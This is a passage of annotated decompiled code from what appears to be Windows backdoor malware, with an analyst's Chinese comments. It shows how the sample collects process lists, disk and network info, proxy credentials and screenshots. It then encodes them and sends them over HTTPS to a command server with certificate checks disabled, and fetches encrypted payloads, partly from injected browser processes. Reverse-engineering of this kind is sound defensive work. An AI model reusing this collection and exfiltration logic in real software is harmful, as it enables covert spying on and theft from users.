      v0 = (v5 == 1) + 15;
      break;
  }
  return v0;
}

//----- (10004505) --------------------------------------------------------
CHAR *bj_sub_10004505_getallprocessimagename()
{
  int v0; // edi
  HANDLE v1; // esi
  int v2; // ebx
  CHAR *v3; // ebx
  PROCESSENTRY32 pe; // [esp+Ch] [ebp-128h]

  v0 = 0;
  v1 = CreateToolhelp32Snapshot(2u, 0);
  pe.dwSize = 296;
  Process32First(v1, &pe);
  v2 = 0;
  do
    v2 += bj_sub_10002D28_strlen((int)pe.szExeFile) + 1;
  while ( Process32Next(v1, &pe) );
  v3 = (CHAR *)bj_sub_10003F3C_alloc(v2 + 1);
  Process32First(v1, &pe);
  do
    v0 += wsprintfA(&v3[v0], "%s\n", pe.szExeFile);
  while ( Process32Next(v1, &pe) );
  CloseHandle(v1);
  return v3;
}

//----- (100045AC) --------------------------------------------------------
BYTE *bj_sub_100045AC_getdiskinfo()
{
  CHAR *v0; // esi
  BYTE *v1; // esi
  HKEY phkResult; // [esp+8h] [ebp-8h]
  DWORD cbData; // [esp+Ch] [ebp-4h]

  v0 = bj_sub_100030D1_strdecrypt((int)&bj_unk_100072E8, 0x2B);// "SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum"
  RegOpenKeyExA(HKEY_LOCAL_MACHINE, v0, 0, 1u, &phkResult);
  bj_sub_10003F45_free(v0);
  cbData = 0;
  RegQueryValueExA(phkResult, "0", 0, 0, 0, &cbData);
  v1 = (BYTE *)bj_sub_10003F3C_alloc(cbData);
  RegQueryValueExA(phkResult, "0", 0, 0, v1, &cbData);
  RegCloseKey(phkResult);
  return v1;                                    // 返回值大概是这样的
                                                // SCSI\Disk&Ven_Micron&Prod_1100\4&101a26c5&0&000200
}

//----- (10004627) --------------------------------------------------------
DWORD bj_sub_10004627()
{
  DWORD VolumeSerialNumber; // [esp+0h] [ebp-4h]

  VolumeSerialNumber = 0;
  GetVolumeInformationW(0, 0, 0, &VolumeSerialNumber, 0, 0, 0, 0);
  return VolumeSerialNumber;
}

//----- (10004648) --------------------------------------------------------
LPVOID __cdecl bj_sub_10004648_getscreenshot(SIZE_T *a1)
{
  LPVOID v1; // edi
  int v2; // esi
  _DWORD *v4; // ebx
  int v5; // eax
  SIZE_T v6; // esi
  IStream *v7; // ST18_4
  IStreamVtbl *v8; // edx
  void (__thiscall **v9)(_DWORD *, signed int); // eax
  char v10; // [esp+Ch] [ebp-30h]
  int v11; // [esp+1Ch] [ebp-20h]
  int v12; // [esp+20h] [ebp-1Ch]
  int v13; // [esp+24h] [ebp-18h]
  int v14; // [esp+28h] [ebp-14h]
  SIZE_T v15; // [esp+2Ch] [ebp-10h]
  int v16; // [esp+34h] [ebp-8h]
  LPSTREAM ppstm; // [esp+38h] [ebp-4h]

  v1 = 0;
  keybd_event_1000381D(0x2C, 0x45, 1, 0);       // PRINT SCREEN key   模拟下压
  Sleep(1000u);
  keybd_event_1000381D(0x2C, 0x45, 3, 0);       // 模拟释放PRINT SCREEN key
  OpenClipboard_bj_sub_100037AD(0);             // 打开clipboard
  v2 = GetClipboardData_1000356E(2);            // CF_BITMAP
  CloseClipboard_10003399();
  if ( !v2 )
    return 0;
  v11 = 1;                                      // the version of GDI+
  v12 = 0;
  v13 = 0;
  v14 = 0;
  GdiplusStartup(&v16, &v11, 0);
  if ( bj_sub_1000401A((int)L"image/jpeg", &v10) )// v10这边应该是保存着image/jpeg的clsid
  {
    v4 = bj_sub_10003FF9(v2, 0);
    ppstm = 0;
    if ( !CreateStreamOnHGlobal_10003491(0, 1, &ppstm) )
    {
      v5 = GdipSaveImageToStream(v4[1], (int)ppstm, (int)&v10, 0);
      if ( v5 )                                 // gpstatus,如果成功了就为0
        v4[2] = v5;
      IStream_Size_100036C4((int)ppstm, (int)&v15);// v13是个LARGE_INTEGER
      v6 = v15;
      v7 = ppstm;
      *a1 = v15;
      IStream_Reset_10003654(v7);               // Moves the seek position in a specified stream to the beginning of the stream.
      v1 = bj_sub_10003F3C_alloc(v6);
      IStream_Read_100035DE((int)ppstm, (int)v1, v6);
      v8 = ppstm->lpVtbl;
      *(_DWORD *)&v10 = ppstm;
      v8->Release(ppstm);
    }
    if ( v4 )
    {
      v9 = (void (__thiscall **)(_DWORD *, signed int))*v4;
      *(_DWORD *)&v10 = 1;
      (*v9)(v4, 1);                             // 这里调用了sub_10003f7c(v4,1)
    }
  }
  GdiplusShutdown(v16);
  return v1;
}
// 10006EB8: using guessed type int __stdcall GdiplusStartup(_DWORD, _DWORD, _DWORD);
// 10006EBE: using guessed type int __stdcall GdiplusShutdown(_DWORD);
// 1000733C: using guessed type wchar_t aImageJpeg[11];

//----- (10004758) --------------------------------------------------------
int *__thiscall bj_sub_10004758(int *this)
{
  int *v1; // esi
  void *v2; // eax
  void *v3; // eax
  int *result; // eax

  v1 = this;
  v2 = bj_sub_10003F04_alloc(4u);               // 分配4个字节
  if ( v2 )
    v3 = bj_sub_10003D80(v2);
  else
    v3 = 0;
  *v1 = (int)v3;
  v1[1] = 0;
  v1[2] = 0;
  v1[3] = 0;
  v1[4] = 0;
  v1[5] = 0;
  v1[6] = (int)bj_sub_10003F3C_alloc(0x14u);
  result = v1;
  v1[7] = 0;
  *((_WORD *)v1 + 0x10) = 0;                    // 0x23 = 35 = 8 * 4 + 3
  *((_BYTE *)v1 + 0x22) = 0;
  return result;
}

//----- (100047A0) --------------------------------------------------------
HANDLE __thiscall bj_sub_100047A0_freeall(void *this)
{
  void *v1; // esi
  unsigned int v2; // edi
  signed int v3; // ecx
  int v4; // ebx
  void (__thiscall ***v5)(_DWORD, signed int); // edx
  HANDLE result; // eax
  LPVOID *v7; // esi
  signed int v8; // [esp+Ch] [ebp-4h]

  v1 = this;
  v2 = 0;
  v3 = 5;
  v4 = 0;
  v8 = 5;
  do
  {
    v5 = *(void (__thiscall ****)(_DWORD, signed int))(v4 + *((_DWORD *)v1 + 6));// 终于找到那个东西的用处了...
    if ( v5 )
    {
      (**v5)(v5, 1);                            // 这里调用了sub_1000688b, 功能基本就是free然后置为0
      v3 = v8;
    }
    v4 += 4;
    v8 = --v3;
  }                                             // 最多4个,全部调用一遍
  while ( v3 );
  bj_sub_10003F45_free(*((LPVOID *)v1 + 2));
  bj_sub_10003F45_free(*((LPVOID *)v1 + 6));
  bj_sub_10003F45_free(*((LPVOID *)v1 + 1));
  if ( *((_DWORD *)v1 + 4) > 0u )
  {
    do
      bj_sub_10003F45_free(*(LPVOID *)(*((_DWORD *)v1 + 3) + 4 * v2++));
    while ( v2 < *((_DWORD *)v1 + 4) );
  }
  result = bj_sub_10003F45_free(*((LPVOID *)v1 + 3));
  v7 = *(LPVOID **)v1;
  if ( v7 )
  {
    bj_sub_10003D8C_free(v7);
    result = bj_sub_10003F1B_free(v7);
  }
  return result;
}

//----- (10004829) --------------------------------------------------------
_DWORD *__thiscall bj_sub_10004829_free(_DWORD *this)
{
  _DWORD *v1; // edi
  unsigned __int16 v2; // si
  _DWORD *result; // eax
  LPVOID *v4; // ecx

  v1 = this;
  v2 = 0;
  do
  {
    result = (_DWORD *)v1[6];
    v4 = (LPVOID *)result[v2];
    if ( !v4 )
      break;
    result = bj_sub_100067EC_free(v4);
    ++v2;
  }
  while ( v2 < 5u );
  return result;
}

//----- (1000484B) --------------------------------------------------------
BOOL __cdecl bj_sub_1000484B_closehandle(HINTERNET *a1)
{
  InternetCloseHandle(a1[2]);
  InternetCloseHandle(a1[1]);
  return InternetCloseHandle(*a1);
}

//----- (1000486B) --------------------------------------------------------
// __Out__ a2
// 
// a2  +0  hInternet1   InternetOpenA
//     +4  hInternet2   InternetConnectA
//     +8  hInternet3   HttpOpenRequestA
int __thiscall bj_sub_1000486B(LPCSTR *this, int a2, LPVOID lpOptional)
{
  LPCSTR *v3; // edi
  int v4; // ebx
  const CHAR *v5; // eax
  DWORD v6; // edx
  void *v7; // eax
  void *v8; // eax
  void *v9; // esi
  void *lpProxyPassword; // eax
  CHAR *v11; // edi
  CHAR *v12; // esi
  unsigned int v13; // eax
  void *v14; // esi
  BOOL v15; // eax
  void *v17; // [esp+Ch] [ebp-1Ch]
  LPCSTR *v18; // [esp+10h] [ebp-18h]
  DWORD dwBufferLength; // [esp+14h] [ebp-14h]
  HINTERNET hConnect; // [esp+18h] [ebp-10h]
  int v21; // [esp+1Ch] [ebp-Ch]
  HINTERNET hInternet; // [esp+20h] [ebp-8h]
  int Buffer; // [esp+24h] [ebp-4h]

  v3 = this;
  v4 = 0;
  v18 = this;
  v5 = (const CHAR *)bj_sub_100053C4_getproxyserver(this);// v5=0   他这里是可以用代理, 也可以不用代理, 但是不用代理, 那岂不是直接就发到google.com去了???
  v6 = 0;
  if ( v5 )
    v6 = 3;                                     // INTERNET_OPEN_TYPE_PROXY
  v7 = InternetOpenA(v3[1], v6, v5, 0, 0);      // user agent字段放着v1[1]的信息, 就前面obtain得到的
  v17 = v7;
  v8 = InternetConnectA(v7, v3[2], 443u, 0, 0, 3u, 0, 0);// 3：INTERNET_SERVICE_HTTP
  v9 = v8;
  hConnect = v8;
  hInternet = (HINTERNET)bj_sub_10005422_getproxyusername(v3);// hInternet=0，跟53c4差不多
  lpProxyPassword = (void *)bj_sub_10005414_getProxyPassword(v3);// v10=0,跟上面两个差不多，都是以v1[7]作为判断标志
  if ( hInternet && lpProxyPassword )
    bj_sub_10004DD9(v9, (LPCSTR)hInternet, lpProxyPassword);// 这个hInternet前面是lpProxyUserName,
                                                // 后面又用来当hInternet了.
  v11 = bj_sub_10005001_datacollect((int *)v3); // 一堆操作
  v12 = bj_sub_100030D1_strdecrypt((int)&POST_100074D8, 4);
  hInternet = HttpOpenRequestA(hConnect, v12, v11, 0, 0, 0, 0x800000u, 0);// INTERNET_FLAG_SECURE
  dwBufferLength = 4;
  InternetQueryOptionA(hInternet, 0x1Fu, &Buffer, &dwBufferLength);// INTERNET_OPTION_SECURITY_FLAGS
  Buffer |= 0x3180u;                            // SECURITY_FLAG_IGNORE_CERT_CN_INVALID|
                                                // SECURITY_FLAG_IGNORE_CERT_DATE_INVALID|
                                                // SECURITY_FLAG_IGNORE_UNKNOWN_CA|
                                                // SECURITY_FLAG_IGNORE_REVOCATION
  InternetSetOptionA(hInternet, 0x1Fu, &Buffer, 4u);
  bj_sub_10003F45_free(v12);
  bj_sub_10003F45_free(v11);
  v13 = bj_sub_10002D28_strlen((int)lpOptional);
  v14 = hInternet;
  v15 = HttpSendRequestA(hInternet, 0, 0, lpOptional, v13);
  v21 = 0;
  if ( v15 )
  {
    lpOptional = (LPVOID)4;
    *((_BYTE *)v18 + 0x22) = 1;
    HttpQueryInfoA(v14, 0x20000013u, &v21, (LPDWORD)&lpOptional, 0);// HTTP_QUERY_STATUS_CODE|
                                                // HTTP_QUERY_FLAG_NUMBER
    v4 = v21;
  }
  *(_DWORD *)(a2 + 4) = hConnect;
  *(_DWORD *)(a2 + 8) = v14;
  *(_DWORD *)a2 = v17;
  return v4;
}

//----- (100049AA) --------------------------------------------------------
// 收集各种信息
CHAR *__thiscall bj_sub_100049AA_pcdatacollection(void *this)
{
  _DWORD *v1; // esi
  CHAR *v2; // eax
  unsigned int v3; // eax
  int v4; // edi
  int v5; // eax
  unsigned int v6; // eax
  unsigned int v7; // ebx
  _BYTE *v8; // eax
  unsigned int v9; // eax
  unsigned int v10; // esi
  unsigned int v11; // ebx
  BYTE *v12; // eax
  BYTE *v13; // ecx
  unsigned int v14; // eax
  CHAR *v15; // eax
  unsigned int v16; // eax
  _BYTE *v17; // eax
  _BYTE *v18; // ebx
  int v19; // esi
  int v20; // esi
  int v21; // esi
  int v22; // eax
  int v23; // esi
  int v24; // esi
  int v25; // esi
  int v26; // eax
  int v27; // esi
  int v28; // eax
  int v29; // esi
  int v30; // eax
  int v31; // esi
  int v32; // eax
  int v33; // esi
  int v34; // eax
  int v35; // esi
  _BYTE *v36; // esi
  CHAR *v37; // edi
  _BYTE *v39; // [esp+10h] [ebp-74h]
  _BYTE *v40; // [esp+14h] [ebp-70h]
  _BYTE *v41; // [esp+18h] [ebp-6Ch]
  int v42; // [esp+1Ch] [ebp-68h]
  unsigned int v43; // [esp+20h] [ebp-64h]
  int v44; // [esp+24h] [ebp-60h]
  BYTE *lpMem; // [esp+28h] [ebp-5Ch]
  CHAR *v46; // [esp+2Ch] [ebp-58h]
  CHAR *v47; // [esp+30h] [ebp-54h]
  BYTE *v48; // [esp+34h] [ebp-50h]
  _BYTE *v49; // [esp+38h] [ebp-4Ch]
  _BYTE *v50; // [esp+3Ch] [ebp-48h]
  _BYTE *v51; // [esp+40h] [ebp-44h]
  _BYTE *v52; // [esp+44h] [ebp-40h]
  _BYTE *v53; // [esp+48h] [ebp-3Ch]
  int v54; // [esp+4Ch] [ebp-38h]
  int v55; // [esp+50h] [ebp-34h]
  int v56; // [esp+54h] [ebp-30h]
  int v57; // [esp+58h] [ebp-2Ch]
  int v58; // [esp+5Ch] [ebp-28h]
  int v59; // [esp+60h] [ebp-24h]
  int v60; // [esp+64h] [ebp-20h]
  int v61; // [esp+68h] [ebp-1Ch]
  int v62; // [esp+6Ch] [ebp-18h]
  DWORD cbBinary; // [esp+70h] [ebp-14h]
  LPVOID v64; // [esp+74h] [ebp-10h]
  LPVOID v65; // [esp+78h] [ebp-Ch]
  int v66; // [esp+7Ch] [ebp-8h]
  char v67; // [esp+82h] [ebp-2h]
  char v68; // [esp+83h] [ebp-1h]

  v1 = this;
  v53 = this;
  v68 = bj_sub_100043BE_getsystemversion();     // 根据系统版本，架构信息返回不同值，一个字节
  v67 = bj_sub_10004161_x86orx64();             // 判断是32位还是64位系统版本，返回对应整数值
  v46 = bj_sub_10004505_getallprocessimagename();// 遍历系统进程，把所有exe名称记录到空间中并返回空间地址
  v42 = bj_sub_10002D28_strlen((int)v46);
  v2 = bj_sub_100041C6_get_ethernet_info();     // 搜集网卡信息
  v47 = v2;
  v3 = bj_sub_10002D28_strlen((int)v2);
  v4 = v3;
  v44 = v3;
  v48 = bj_sub_100045AC_getdiskinfo();          // 读注册表中某一项的值并返回  -- 磁盘相关
  v55 = bj_sub_10002D28_strlen((int)v48);
  v5 = bj_sub_100053C4_getproxyserver(v1);
  v41 = (_BYTE *)v5;
  v6 = bj_sub_10002D28_strlen(v5);
  v7 = v6;
  v60 = v6;
  v40 = (_BYTE *)bj_sub_10005422_getproxyusername(v1);
  v66 = bj_sub_10002D28_strlen((int)v40);
  v39 = (_BYTE *)bj_sub_10005414_getProxyPassword(v1);
  v59 = bj_sub_10002D28_strlen((int)v39);
  v43 = v7 + v66 + v59 + bj_sub_10002D28_strlen((int)":");
  v49 = bj_sub_100030D1_strdecrypt((int)&disk_100074BC, 5);// disk=
  v56 = bj_sub_10002D28_strlen((int)v49);
  v50 = bj_sub_100030D1_strdecrypt((int)&build_100074C4, 6);// build=
  v62 = bj_sub_10002D28_strlen((int)v50);
  v51 = bj_sub_100030D1_strdecrypt((int)&bj_10007594, 10);// "0x20abb3f1"
  v61 = bj_sub_10002D28_strlen((int)v51);
  v8 = bj_sub_100030D1_strdecrypt((int)&inject_100074CC, 6);
  v52 = v8;
  v9 = bj_sub_10002D28_strlen((int)v8);
  v10 = v9;
  v11 = 0;
  v54 = v9;
  v57 = 0;
  cbBinary = 0;
  v12 = (BYTE *)bj_sub_10004648_getscreenshot(&cbBinary);// 屏幕截图 jpeg stream  cbBInary为streamsize
  v13 = v12;
  v65 = 0;
  lpMem = v12;
  v64 = 0;
  v14 = 0;
  v58 = 0;
  if ( lpMem && cbBinary > 0 )
  {
    v15 = bj_sub_10002F22_base64crypt(v13, cbBinary);
    v65 = v15;
    v16 = bj_sub_10002D28_strlen((int)v15);
    v11 = v16;
    v57 = v16;
    bj_sub_10003F45_free(lpMem);
    v17 = bj_sub_100030D1_strdecrypt((int)&img_100074D4, 4);// img=
    v64 = v17;
    v14 = bj_sub_10002D28_strlen((int)v17);
    v4 = v44;
    v58 = v14;
  }
  v18 = bj_sub_10003F3C_alloc(v4 + v55 + v56 + v62 + v61 + v10 + v11 + v14 + v43 + v42 + 8);
  bj_sub_10003271_cpy((int)v18, &v68, 1);
  bj_sub_10003271_cpy((int)(v18 + 1), &v67, 1);
  bj_sub_10003271_cpy((int)(v18 + 2), v46, v42);
  v19 = v42 + 2;
  if ( v47 && v4 > 0 )
  {
    bj_sub_10003271_cpy((int)&v18[v19], v47, v4);
    v19 += v4;
  }
  bj_sub_10003271_cpy((int)&v18[v19], v49, v56);
  v20 = v56 + v19;
  bj_sub_10003271_cpy((int)&v18[v20], v48, v55);
  v21 = v55 + v20;
  v22 = lstrlenA("\n");
  bj_sub_10003271_cpy((int)&v18[v21], "\n", v22);
  v23 = lstrlenA("\n") + v21;
  bj_sub_10003271_cpy((int)&v18[v23], v50, v62);
  v24 = v62 + v23;
  bj_sub_10003271_cpy((int)&v18[v24], v51, v61);
  v25 = v61 + v24;
  if ( v53[0x20] )                              // 是否注入到浏览器进程后进行的网络操作.
  {
    v26 = lstrlenA("\n");
    bj_sub_10003271_cpy((int)&v18[v25], "\n", v26);
    v27 = lstrlenA("\n") + v25;
    bj_sub_10003271_cpy((int)&v18[v27], v52, v54);
    v25 = v54 + v27;
  }
  if ( v60 > 0 )
  {
    v28 = lstrlenA("\n");
    bj_sub_10003271_cpy((int)&v18[v25], "\n", v28);
    v29 = lstrlenA("\n") + v25;
    bj_sub_10003271_cpy((int)&v18[v29], v41, v60);
    v25 = v60 + v29;
  }
  if ( v66 > 0 )
  {
    v30 = lstrlenA(" ");
    bj_sub_10003271_cpy((int)&v18[v25], " ", v30);
    v31 = lstrlenA(" ") + v25;
    bj_sub_10003271_cpy((int)&v18[v31], v40, v66);
    v25 = v66 + v31;
  }
  if ( v59 > 0 )
  {
    v32 = lstrlenA(":");
    bj_sub_10003271_cpy((int)&v18[v25], ":", v32);
    v33 = lstrlenA(":") + v25;
    bj_sub_10003271_cpy((int)&v18[v33], v39, v59);
    v25 = v59 + v33;
  }
  if ( v64 && v58 > 0 && v65 && v57 > 0 )
  {
    v34 = lstrlenA("\n");
    bj_sub_10003271_cpy((int)&v18[v25], "\n", v34);
    v35 = (int)&v18[lstrlenA("\n") + v25];
    bj_sub_10003271_cpy(v35, v64, v58);
    bj_sub_10003271_cpy(v35 + v58, v65, v57);
  }
  v36 = bj_sub_100030D1_strdecrypt((int)&w_1000735A, 1);// w
  v37 = bj_sub_10005880_makehttpsoptionalfield(v53, (int)v36, v18);// 可选字段是w=xxxx    xxxx是一个地址,在本地进程中有效, 这里居然要把他发送到服务器上, 估计是为了shellcode的构造, 因为这个shellcode是直接执行的那种, 而不是什么cmd命令.
  bj_sub_10003F45_free(v65);
  bj_sub_10003F45_free(v64);
  bj_sub_10003F45_free(v52);
  bj_sub_10003F45_free(v36);
  bj_sub_10003F45_free(v18);
  bj_sub_10003F45_free(v51);
  bj_sub_10003F45_free(v50);
  bj_sub_10003F45_free(v49);
  bj_sub_10003F45_free(v48);
  bj_sub_10003F45_free(v47);
  bj_sub_10003F45_free(v46);
  return v37;
}

//----- (10004DD9) --------------------------------------------------------
BOOL __cdecl bj_sub_10004DD9(HINTERNET hInternet, LPCSTR lpString, LPVOID lpBuffer)
{
  DWORD v3; // esi
  DWORD v4; // edi

  v3 = lstrlenA(lpString) + 1;
  v4 = bj_sub_10002D28_strlen((int)lpBuffer) + 1;
  InternetSetOptionA(hInternet, 43u, (LPVOID)lpString, v3);// INTERNET_OPTION_PROXY_USERNAME
  return InternetSetOptionA(hInternet, 44u, lpBuffer, v4);// INTERNET_OPTION_PROXY_PASSWORD
}

//----- (10004E16) --------------------------------------------------------
void *__thiscall bj_sub_10004E16(_DWORD *this, LPCSTR lpszServerName, LPCSTR lpszObjectName, LPCSTR lpString, LPCSTR lpszVerb, int a6)
{
  void *v6; // edi
  _DWORD *v7; // esi
  const CHAR *v8; // eax
  DWORD v9; // ecx
  void *v10; // ebx
  void *lpProxyPassword; // eax
  void *v12; // esi
  int v13; // eax
  BOOL v14; // eax
  int v15; // ecx
  int v16; // ebx
  CHAR *v17; // eax
  void *v19; // [esp+Ch] [ebp-14h]
  void *v20; // [esp+10h] [ebp-10h]
  void *v21; // [esp+14h] [ebp-Ch]
  void *v22; // [esp+18h] [ebp-8h]
  int Buffer; // [esp+1Ch] [ebp-4h]
  const CHAR *lpszProxyUserName; // [esp+28h] [ebp+8h]
  CHAR *lpszServerNameb; // [esp+28h] [ebp+8h]

  v6 = 0;
  v7 = this;
  v20 = 0;
  v21 = 0;
  v8 = (const CHAR *)bj_sub_100053C4_getproxyserver(this);
  v9 = 0;
  if ( v8 )
    v9 = 3;
  v22 = InternetOpenA((LPCSTR)v7[1], v9, v8, 0, 0);
  v10 = InternetConnectA(v22, lpszServerName, 443u, 0, 0, 3u, 0, 0);
  lpszProxyUserName = (const CHAR *)bj_sub_10005422_getproxyusername(v7);
  lpProxyPassword = (void *)bj_sub_10005414_getProxyPassword(v7);
  if ( lpszProxyUserName && lpProxyPassword )
    bj_sub_10004DD9(v10, lpszProxyUserName, lpProxyPassword);
  v12 = HttpOpenRequestA(v10, lpszVerb, lpszObjectName, 0, 0, 0, 0x800000u, 0);
  bj_sub_10001D56(v12);                         // 取消一些安全提醒,前面出现过类似代码.
  v13 = lstrlenA(lpString);
  v14 = HttpSendRequestA(v12, 0, 0, (LPVOID)lpString, v13);
  v15 = 0;
  Buffer = 0;
  if ( v14 )
  {
    lpString = (LPCSTR)4;
    HttpQueryInfoA(v12, 0x20000013u, &Buffer, (LPDWORD)&lpString, 0);
    v15 = Buffer;
  }
  v20 = v10;
  v19 = v22;
  v21 = v12;
  if ( v15 == 200 )
  {
    v16 = 0;
    lpString = 0;
    v17 = (CHAR *)bj_sub_1000295A_alloc(0x10000u);
    for ( lpszServerNameb = v17; ; v17 = lpszServerNameb )
    {
      InternetReadFile(v12, v17, 0x10000u, (LPDWORD)&lpString);
      if ( !lpString )
        break;
      v6 = bj_realloc_sub_10002AAD(v6, (SIZE_T)&lpString[v16]);
      bj_sub_10003271_cpy((int)v6 + v16, lpszServerNameb, (int)lpString);
      v16 += (int)lpString;
      if ( !lpString )
        break;
    }
    *(_DWORD *)a6 = v16;
    bj_sub_10002A8F_free(lpszServerNameb);
  }
  bj_sub_1000484B_closehandle(&v19);
  return v6;
}

//----- (10004F6F) --------------------------------------------------------
int __thiscall bj_sub_10004F6F(_DWORD *this, int a2, int a3, int a4, int a5, int a6, _DWORD *a7)
{
  _DWORD *v7; // edi
  int v8; // esi
  int v9; // ebx
  int v10; // edx
  signed int v11; // eax
  int v13; // [esp+Ch] [ebp-30h]
  int v14; // [esp+10h] [ebp-2Ch]
  int v15; // [esp+14h] [ebp-28h]
  int v16; // [esp+18h] [ebp-24h]
  int v17; // [esp+1Ch] [ebp-20h]
  int v18; // [esp+20h] [ebp-1Ch]
  int v19; // [esp+24h] [ebp-18h]
  int v20; // [esp+28h] [ebp-14h]
  int v21; // [esp+2Ch] [ebp-10h]
  int v22; // [esp+30h] [ebp-Ch]
  int v23; // [esp+34h] [ebp-8h]
  _DWORD *v24; // [esp+38h] [ebp-4h]

  *a7 = 0;
  v7 = this;
  v24 = this;
  v8 = bj_sub_100053C4_getproxyserver(this);
  v9 = bj_sub_10005422_getproxyusername(v7);
  v10 = bj_sub_10005414_getProxyPassword(v7);
  v11 = 0;
  if ( v8 )
    v11 = 3;
  v23 = v11;
  memset(&v14, 0, 0x24u);
  v15 = v8;
  v17 = v9;
  v13 = v24[1];
  v14 = v11;
  v16 = a2;
  v19 = a5;
  v20 = a3;
  v21 = a6;
  v22 = a4;
  v18 = v10;
  return bj_sub_100017CA((int)&v13, a7);
}

//----- (10005001) --------------------------------------------------------
CHAR *__thiscall bj_sub_10005001_datacollect(int *this)
{
  int *v1; // edi
  CHAR *v2; // ST50_4
  _BYTE *v3; // eax
  int v4; // ebx
  void *v5; // ST4C_4
  CHAR *v6; // ST54_4
  unsigned int v7; // eax
  _BYTE *v8; // ST58_4
  DWORD v9; // esi
  unsigned int v10; // eax
  _BYTE *lpMem; // ST5C_4
  int v12; // eax
  CHAR *v13; // ebx
  _BYTE *v14; // edi
  CHAR *v15; // esi

  v1 = this;
  v2 = (CHAR *)bj_sub_10003F3C_alloc(0x401u);
  v3 = bj_sub_100030D1_strdecrypt((int)&bj_unk_1000735C, 10);// "Ec[Ec?#s(["
  v4 = (int)v3;
  v5 = v3;
  v6 = bj_sub_10003DFA((_DWORD *)*v1, 6, 5);    // 产生随机字符串, 有arg3个部分，每个部分最大长度为arg2(不包括/)，最小有1个部分，最小每个部分长度为1.每个部分以/分隔。
                                                // 形如"23afc/Dsf/S324/"
  v7 = bj_sub_10003DE0_randnum(1, 7);
  v8 = bj_sub_10003E73((_DWORD *)*v1, v7);      // 随机字符串，长度1~7
  v9 = bj_sub_10003DE0_randnum(0, 7);
  v10 = bj_sub_10003DE0_randnum(1, 3);
  lpMem = bj_sub_10003E73((_DWORD *)*v1, v10);  // 1~3随机字符串
  v12 = bj_sub_10002D28_strlen(v4);
  v13 = bj_sub_10003123_xorencrpyt(v4, v12, 0); // 将arg1字符串先异或加密，之后base64加密，返回      ■
                                                // 异或其中一个是随机密钥，另外一个是固定密钥
                                                // 随机密钥被保存在开头4个字节, 然后会有2个字节的hash值, 是由数据生成的,用于完整性校验
  v14 = bj_sub_100030D1_strdecrypt((int)&byte_100073C0[0x1F * v9], 0x1F);// 
                                                // 0 ".vnd.etsi.iptvsync+xml"
                                                // 1 ".DAT12"
                                                // 2 ".t38"
                                                // 3 ".delivery-status"
                                                // 4 ".vnd.mts"
                                                // 5 ".appledouble"
                                                // 6 ".dns"
                                                // 7 ".vnd.iptvforum.2dparityfec-2005"
  v15 = bj_sub_100030D1_strdecrypt((int)&bj_unk_100074E0, 14);// "/%s%s%s/?%s=%s"
  wsprintfA(v2, v15, v6, v8, v14, lpMem, v13);  // 这里的信息都是来源于自身。
  bj_sub_10003F45_free(v15);
  bj_sub_10003F45_free(v14);
  bj_sub_10003F45_free(v13);
  bj_sub_10003F45_free(lpMem);
  bj_sub_10003F45_free(v8);
  bj_sub_10003F45_free(v6);
  bj_sub_10003F45_free(v5);
  return v2;
}
/* Orphan comments:
0~9A~Za~z
*/

//----- (100050FD) --------------------------------------------------------
// arg2: HTTP的可选字段
void *__thiscall bj_sub_100050FD_getfilefromserver(LPCSTR *this, int Buffer, int a3)
{
  void *v3; // esi
  unsigned int v4; // edi
  int v5; // eax
  char *v6; // esi
  bool AreAllBytesRead; // zf
  void *v8; // edi
  HINTERNET v10; // [esp+4h] [ebp-18h]
  HINTERNET v11; // [esp+8h] [ebp-14h]
  HINTERNET hRequest; // [esp+Ch] [ebp-10h]
  DWORD dwBufferLength; // [esp+10h] [ebp-Ch]
  LPVOID lpMem; // [esp+14h] [ebp-8h]
  DWORD dwNumberOfBytesRead; // [esp+18h] [ebp-4h]

  v3 = 0;
  v10 = 0;
  v11 = 0;
  hRequest = 0;
  if ( bj_sub_1000486B(this, (int)&v10, (LPVOID)Buffer) == 200 )
  {
    dwBufferLength = 4;
    Buffer = 0;
    if ( hRequest )
    {
      HttpQueryInfoA(hRequest, 0x20000005u, &Buffer, &dwBufferLength, 0);// HTTP_QUERY_FLAG_NUMBER|HTTP_QUERY_CONTENT_LENGTH
      if ( (unsigned int)Buffer > 0x24 )
      {
        lpMem = bj_sub_10003F3C_alloc(Buffer);
        v4 = 0;
        v5 = Buffer;
        dwNumberOfBytesRead = 0;
        v6 = (char *)lpMem;
        do
        {
          InternetReadFile(hRequest, &v6[v4], v5, &dwNumberOfBytesRead);
          v4 += dwNumberOfBytesRead;
          v5 = Buffer;
        }
        while ( dwNumberOfBytesRead && v4 < Buffer );
        AreAllBytesRead = v4 == Buffer;
        v8 = lpMem;
        v3 = 0;
        if ( AreAllBytesRead )
          v3 = bj_sub_10002FFB_receivingdatadecrypt((LPCSTR)lpMem, Buffer, a3);
        bj_sub_10003F45_free(v8);
      }
    }
  }
  bj_sub_1000484B_closehandle(&v10);
  return v3;
}

//----- (100051C0) --------------------------------------------------------
// 跟问号表达式后面的操作一样, 只不过这里是注入到其他进程后执行,并得到返回结果
void *__thiscall bj_sub_100051C0_inject_getfilefromserver(int *this, int a2, _DWORD *a3)
{
  int *v3; // esi
  int v4; // ebx
  int v5; // esi
  signed int v6; // edx
  void *v7; // edi
  void *v8; // esi
  _BYTE *v9; // ebx
  int *v10; // edi
  void *v11; // esi
  int v13; // [esp+Ch] [ebp-3Ch]
  int v14; // [esp+10h] [ebp-38h]
  int v15; // [esp+14h] [ebp-34h]
  int v16; // [esp+18h] [ebp-30h]
  int v17; // [esp+1Ch] [ebp-2Ch]
  int v18; // [esp+20h] [ebp-28h]
  LPVOID v19; // [esp+24h] [ebp-24h]
  LPVOID v20; // [esp+28h] [ebp-20h]
  int v21; // [esp+2Ch] [ebp-1Ch]
  int v22; // [esp+30h] [ebp-18h]
  LPVOID v23; // [esp+34h] [ebp-14h]
  LPVOID lpMem; // [esp+38h] [ebp-10h]
  int v25; // [esp+3Ch] [ebp-Ch]
  DWORD cchString; // [esp+40h] [ebp-8h]
  int *v27; // [esp+44h] [ebp-4h]

  v3 = this;
  v27 = this;
  v23 = bj_sub_10005001_datacollect(this);
  lpMem = bj_sub_100030D1_strdecrypt((int)&POST_100074D8, 4);
  v4 = bj_sub_100053C4_getproxyserver(v3);
  v25 = bj_sub_10005422_getproxyusername(v3);
  v5 = bj_sub_10005414_getProxyPassword(v3);
  v6 = 0;
  if ( v4 )
    v6 = 3;
  memset(&v14, 0, 0x24u);
  v7 = v23;
  v18 = v5;
  v8 = lpMem;
  v13 = v27[1];
  v16 = v27[2];
  v17 = v25;
  v22 = a2;
  v14 = v6;
  v15 = v4;
